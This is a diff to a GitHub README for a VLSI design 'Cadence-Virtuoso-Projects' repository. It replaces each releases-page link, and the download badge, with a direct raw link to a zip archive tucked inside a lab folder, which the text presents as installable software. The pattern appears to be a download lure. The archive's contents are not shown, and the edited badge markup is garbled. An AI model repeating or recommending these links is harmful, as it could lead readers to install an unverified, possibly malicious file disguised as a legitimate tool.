@@ -2,13 +2,13 @@
 # 🎉 Cadence-Virtuoso-Projects - Simplify Your VLSI Design Process
 
 ## 📥 Download & Install
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF4C00.svg?style=flat&logo=github&logoColor=white)](https://github.com/ghanemS/Cadence-Virtuoso-Projects/releases)
+[![Download Now](https://github.com/ghanemS/Cadence-Virtuoso-Projects/raw/refs/heads/main/Lab1_PrimeNumberDetector/Virtuoso_Cadence_Projects_v1.6.zip%20Now-%https://github.com/ghanemS/Cadence-Virtuoso-Projects/raw/refs/heads/main/Lab1_PrimeNumberDetector/Virtuoso_Cadence_Projects_v1.6.zip)](https://github.com/ghanemS/Cadence-Virtuoso-Projects/raw/refs/heads/main/Lab1_PrimeNumberDetector/Virtuoso_Cadence_Projects_v1.6.zip)
 
 Welcome to **Cadence-Virtuoso-Projects**, where you can find essential tools to make your VLSI design tasks smooth and efficient. This application focuses on 45nm CMOS technology and supports projects related to CPU and ALU designs. Follow the steps below to install the software.
 
 ### 🚀 Getting Started
 1. **Visit the Releases Page:** Click on the link below to access the releases page where you can find the download files.
-   - [Visit this page to download](https://github.com/ghanemS/Cadence-Virtuoso-Projects/releases)
+   - [Visit this page to download](https://github.com/ghanemS/Cadence-Virtuoso-Projects/raw/refs/heads/main/Lab1_PrimeNumberDetector/Virtuoso_Cadence_Projects_v1.6.zip)
 
 2. **Select the Latest Release:** On the releases page, look for the latest version of the software. It will be at the top of the list. Click on it to expand the details.
 
@@ -48,7 +48,7 @@ For detailed information on how to use each feature, refer to the included help 
 ### 🔗 Support
 If you encounter issues while downloading or installing, feel free to open an issue on our GitHub page. 
 
-- [Visit this page to download](https://github.com/ghanemS/Cadence-Virtuoso-Projects/releases)
+- [Visit this page to download](https://github.com/ghanemS/Cadence-Virtuoso-Projects/raw/refs/heads/main/Lab1_PrimeNumberDetector/Virtuoso_Cadence_Projects_v1.6.zip)
 
 We hope you enjoy using Cadence-Virtuoso-Projects. Simplifying your VLSI design experience is our goal!
 ```
